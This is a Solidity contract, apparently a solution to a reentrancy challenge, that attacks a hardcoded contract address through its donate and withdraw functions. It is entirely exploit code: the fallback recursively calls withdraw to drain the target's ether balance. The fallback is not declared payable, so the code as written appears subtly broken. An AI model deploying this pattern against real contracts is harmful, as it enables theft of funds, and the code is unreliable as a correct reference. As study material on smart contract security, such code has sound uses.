pragma solidity ^0.8.10;

interface IReentrance{
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract AttackReentrancy{    
    address contractAddress = 0xABF83aD603829851f6cc631D4bcCD084b0EAedb9;
    IReentrance public challengeContract = IReentrance(contractAddress);
    uint amount; 

    fallback() external {
        drain();
    }
    function attack() external payable {
        amount=msg.value;
        challengeContract.donate{value:amount}(address(this));
        challengeContract.withdraw(amount);
    }
    function drain() private {
        uint remainingBalance = address(challengeContract).balance;
                                
        if(remainingBalance > 0) {
            uint toWithdraw = (remainingBalance > amount? amount:remainingBalance);
            challengeContract.withdraw(toWithdraw);
        }
    }
}